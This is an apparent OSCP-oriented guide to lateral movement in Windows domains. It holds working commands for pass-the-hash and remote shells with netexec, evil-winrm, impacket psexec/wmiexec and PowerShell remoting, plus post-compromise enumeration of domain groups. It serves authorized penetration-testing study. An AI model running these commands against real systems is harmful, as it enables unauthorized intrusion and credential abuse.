# Lateral-Movement Decision Guide

Move only when the credential, reachable service, and required privilege form a defensible path. A failed protocol does not invalidate a credential; it may lack logon rights or administrative access for that service.

## Choose by material and service

| You have | Reachable service | First validation | Typical shell path |
| --- | --- | --- | --- |
| Password | SMB 445 | `netexec smb HOST -d DOMAIN -u USER -p PASS` | `impacket-psexec` or `impacket-wmiexec` after admin is confirmed |
| Password | WinRM 5985/5986 | `netexec winrm HOST -d DOMAIN -u USER -p PASS` | `evil-winrm` |
| Password | RDP 3389 | Check group/logon rights | `xfreerdp` with the plaintext password |
| NTLM hash | SMB 445 | `netexec smb HOST -u USER -H HASH` | Impacket execution with `-hashes :HASH` after admin is confirmed |
| NTLM hash | WinRM | `netexec winrm HOST -u USER -H HASH` | `evil-winrm -H HASH` |
| Kerberos ticket | Kerberos plus target service | Inspect ticket identity, SPN, and expiry | Use the matching Kerberos-aware client and service |
| Domain shell | PowerShell remoting allowed | `Test-WSMan HOST` and authorization checks | `Enter-PSSession` or `Invoke-Command` |

Use variables or an interactive prompt for secrets so plaintext is not written directly into shell history.

## Confirm authorization before execution

```bash
netexec smb HOST -d DOMAIN -u USER -p PASS
netexec winrm HOST -d DOMAIN -u USER -p PASS
```

Interpret results carefully:

- Authentication success means the credential is valid.
- Administrative success is required for service creation, WMI execution, or remote registry access.
- WinRM/RDP may require explicit group membership even when the account is otherwise privileged.
- Local accounts often need `--local-auth`; domain and local authentication are not interchangeable.

## Shell examples

```bash
read -r -s -p "Password: " AD_PASS; echo
evil-winrm -i HOST -u USER -p "$AD_PASS"
impacket-wmiexec 'DOMAIN/USER'@HOST
impacket-psexec 'DOMAIN/USER'@HOST
impacket-wmiexec -hashes :NTLM_HASH 'DOMAIN/USER'@HOST
```

PowerShell remoting from a Windows foothold:

```powershell
$secure = Read-Host 'Password' -AsSecureString
$cred = [pscredential]::new('DOMAIN\USER', $secure)
Invoke-Command -ComputerName HOST -Credential $cred -ScriptBlock { whoami; hostname }
Enter-PSSession -ComputerName HOST -Credential $cred
```

## Re-enumerate after every hop

On the new host, immediately collect:

```text
whoami /all
hostname
ipconfig /all
route print
netstat -ano
net user /domain
net group "Domain Admins" /domain
```

Then check:

- New local privileges and group memberships
- Saved credentials and service accounts
- New network routes or interfaces
- Sessions and local-admin relationships in BloodHound
- Proof/control-panel objectives on that host

## Evidence template

Record:

1. Source identity and host
2. Credential/hash source
3. Validation command and result
4. Why remote execution was authorized
5. Exact shell command
6. Destination identity and host
7. Screenshot/output path

Avoid changing RDP policy, installing persistence, disabling protections, or injecting credential providers merely to obtain a shell. Those actions add risk and rarely prove an OSCP objective better than WinRM, WMI, SMB, or a standard PowerShell session.
